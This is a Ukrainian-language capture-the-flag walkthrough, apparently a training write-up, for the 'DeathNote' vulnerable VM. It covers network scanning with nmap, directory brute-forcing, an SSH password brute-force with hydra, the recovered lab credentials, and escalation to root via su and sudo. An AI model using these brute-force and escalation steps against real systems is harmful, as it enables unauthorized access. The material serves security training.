### 1. Перша команда яку ми використовуємо —

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#1-%D0%BF%D0%B5%D1%80%D1%88%D0%B0-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0-%D1%8F%D0%BA%D1%83-%D0%BC%D0%B8-%[...]

```shell
   sudo netdiscover -r 10.0.2.0/24
```
![Pasted image 20260730161408.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161408.png)

```shell
   nmap -Pn -V 10.0.2.X
```
![Pasted image 20260730161417.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161417.png)

- Параметр `-Pn` вимикає пінг — подібно `nmap` не перевіряє чи жива ціль за допомогою ping або SYN-сканування. Це к�[...]
- Параметр `-V` — виводиться більш "підсилена" інформація під час сканування.
- Бачимо два відкритих порти: **22** та **80**.
- Робити брутфорс на ssh (22) не має сенсу, до поки ми не маємо а ні **логіну**, а ні **паролю**.
- В браузері відкриваємо 10.0.2.Х з метою розуміння, який саме сервіс працює на **80** порті.
- Як результат маємо помилку, але маємо і підказку у вигляді доменного імені **deathnote.vuln**: [![alt text](https://github.com/onl[...]
- Робимо висновок, що нам потрібно зарезолвити це доменне ім'я, а це можно зробити за допомогою локального ф�[...]

### 2. Для пошуку **hosts** застосовуємо команду:

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#2-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%BE%D1%88%D1%83%D0%BA%D1%83-hosts-%D0%B7%D0%B0%D1%81%D1%82%D0%BE%D1%81%D0%BE%D[...]

```shell
whereis hosts
```
![Pasted image 20260730161454.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161454.png)

- `whereis` — команда, яка шукає файли, пов'язані з певним словом.

### 3. Далі заходимо у текстовий редактор nano з правами адміністратора (root)

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#3-%D0%B4%D0%B0%D0%BB%D1%96-%D0%B7%D0%B0%D1%85%D0%BE%D0%B4%D0%B8%D0%BC%D0%BE-%D1%83-%D1%82%D0%B5%D0%BA%D1%81%[...]

```shell
sudo nano /etc/hosts
```

- Вводимо IP:
    
    ```
    10.0.2.X deathnote.vuln
    ```
    

---

![Pasted image 20260730161507.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161507.png)

### 4. Перехід на веб-сторінку

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#4-%D0%BF%D0%B5%D1%80%D0%B5%D1%85%D1%96%D0%B4-%D0%BD%D0%B0-%D0%B2%D0%B5%D0%B1-%D1%81%D1%82%D0%BE%D1%80%D1%96%[...]

- У HTML-коді знаходимо посилання на директорію, де була зберігається картинки, в назві яких міститься "kira". ![Pasted image 20260730161526.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161526.png)
- Заходимо за цією адресою, бачимо багато файлів, і два з них у форматі `.txt` з іменами **notes** та **user**.
    ![Pasted image 20260730161531.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161531.png)

---

### 5. Для сканування директорій використовуємо

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#5-%D0%B4%D0%BB%D1%8F-%D1%81%D0%BA%D0%B0%D0%BD%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B4%D0%B8%D1%80%D0%B5%D0%BA%D1%...]

```shell
dirsearch -u http://deathnote.vuln/
```

- або користуємось аналогами (**dirb** (присутня в Калі по замовчанню) або **gobuster**)

> Для використання її потрібно попередньо встановити командою:

```shell
sudo apt install dirsearch
```

- Параметр `-u` — вказує URL сайту, на якому потрібно провести brute-force директорій та файлів.
 ![Pasted image 20260730161544.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161544.png)

---

#### Ця команда вивела нам файли, серед них ми знайшли

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#%D1%86%D1%8F-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0-%D0%B2%D0%B8%D0%B2%D0%B5%D0%BB%D0%B0-%D0%BD%D0%B0%D0%BC-[...]

```
/robots.txt  
/wordpress/wp-login.php
```

- Заходимо на сторінку з `/robots.txt`, нас зустрічає текст, який каже, що нам потрібно зайти на `/important.jpg`. ![Pasted image 20260730161558.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161558.png)
- Але не знайшовши там нічого, використовуємо команду:

```shell
curl http://deathnote.vuln/important.jpg
```

![Pasted image 20260730161608.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161608.png)

- Це команда — інструмент для роботи з HTTP(S)-запитами, дозволяє завантажити вміст за вказаним URL.
    
- Отримуємо відповідь, у якій згадуються `user.txt` — може бути ідентифікатор, а також `notes.txt` — може бути спис[...]
    
- Як результат переходимо за шляхом та маємо наступне: [![alt text](https://github.com/online-marathon/AC-deathnote/raw/main/DN_src/image-5.png)](http[...]
    
- зберігаємо собі **notes.txt** та **user.txt**.
    

### 6. Скористаємось інструментом дл брут-форсу логінів і паролів `hydra`

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#6-%D1%81%D0%BA%D0%BE%D1%80%D0%B8%D1%81%D1%82%D0%B0%D1%94%D0%BC%D0%BE%D1%81%D1%8C-%D1%96%D0%BD%D1%81%D1%82%D1%80%D...]

```

hydra -L user.txt -P notes.txt 10.0.2.6 ssh

```
![Pasted image 20260730161638.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161638.png)
- Параметр `-L` — вказує файл із логінами.
- Параметр `-P` — вказує файл із паролями.

(У цьому випадку, при використанні інструменту `medusa` — більш швидкісного, виявилася проблема спочатку із �[...]

- Як результат, маємо логін та пароль для ssh з'єднання: ![Pasted image 20260730161642.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161642.png)

#### Заходимо через ssh порт з отриманими логіном і паролем (l:death4me)

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#%D0%B7%D0%B0%D1%85%D0%BE%D0%B4%D0%B8%D0%BC%D0%BE-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-ssh-%D0%BF%D0%BE%D1%80%D1%8[...]

```shell
ssh l@10.0.2.X
```

#### Після логінування через ssh в домашньому каталозі cеред файлів знаходимо `user.txt`,

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#%D0%BF%D1%96%D1%81%D0%BB%D1%8F-%D0%BB%D0%BE%D0%B3%D1%96%D0%BD%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D1%87%D0%B5%D1%...]

![Pasted image 20260730161721.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161721.png)(Я забув зберег[...]

#### Переглядаємо його та бачимо текст, написаний мовою `brainfuck`.

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#%D0%BF%D0%B5%D1%80%D0%B5%D0%B3%D0%BB%D1%8F%D0%B4%D0%B0%D1%94%D0%BC%D0%BE-%D0%B9%D0%BE%D0%B3%D0%BE-%D1%82%D0[...]

- Перекодовуємо його за допомогою `dcode.fr`.
- ![Pasted image 20260730161721.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161721.png)

#### _i think u got the shell , but you wont be able to kill me -kira_

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#i-think-u-got-the-shell--but-you-wont-be-able-to-kill-me--kira)

#### 7. Шукаємо по всієї файловій системі файли та директорії, які мають в назві "kira":

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#7-%D1%88%D1%83%D0%BA%D0%B0%D1%94%D0%BC%D0%BE-%D0%BF%D0%BE-%D0%B2%D1%81%D1%96%D1%94%D1%97-%D1%84%D0%B0%D0%B9[...]

![Pasted image 20260730161751.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161751.png)
![Pasted image 20260730161820.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161820.png)
#### Переміщуємось по директоріях командами:

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#%D0%BF%D0%B5%D1%80%D0%B5%D0%BC%D1%96%D1%89%D1%83%D1%94%D0%BC%D0%BE%D1%81%D1%8C-%D0%BF%D0%BE-%D0%B4%D0%B8%D1%80%D0%B5%D0%BA%D1%...]

```
cd ..
cd kira
cd /opt
cd kira-case

```
![Pasted image 20260730161826.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161826.png)

![Pasted image 20260730161901.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161901.png)

```

password: kiraisevil

```

### 8. Переходимо на юзера kira командою:

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#8-%D0%BF%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4%D0%B8%D0%BC%D0%BE-%D0%BD%D0%B0-%D1%8E%D0%B7%D0%B5%D1%80%D0%B0-[...]

```

su kira

```

> Ця команда використовується для зміни користувача в поточній сесії.

та вводимо свіжо отриманий пароль.
![Pasted image 20260730161921.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161921.png)

### 9. Спробуємо використати той самий пароль для отримання суперкористувача:

[](https://github.com/online-marathon/AC-deathnote/blob/main/description%20deathnote.md#9-%D1%81%D0%BF%D1%80%D0%BE%D0%B1%D1%83%D1%94%D0%BC%D0%BE-%D0%B2%D0%B8%D0%BA%D0%BE%D1%80%D0%B8%D1%81%D1%82%D[...]

```

sudo -i

```

_Успішний вхід!_

- Змінюємо директорію:

```

cd /root

```

та переглядаємо файли:

```

ls

```

#### Знаходимо файл `root.txt` та виводимо.
![Pasted image 20260730161932.png](https://raw.githubusercontent.com/crazer111/SoftServe-summer-practice-2026/main/DeathNote/Pasted%20image%2020260730161932.png)
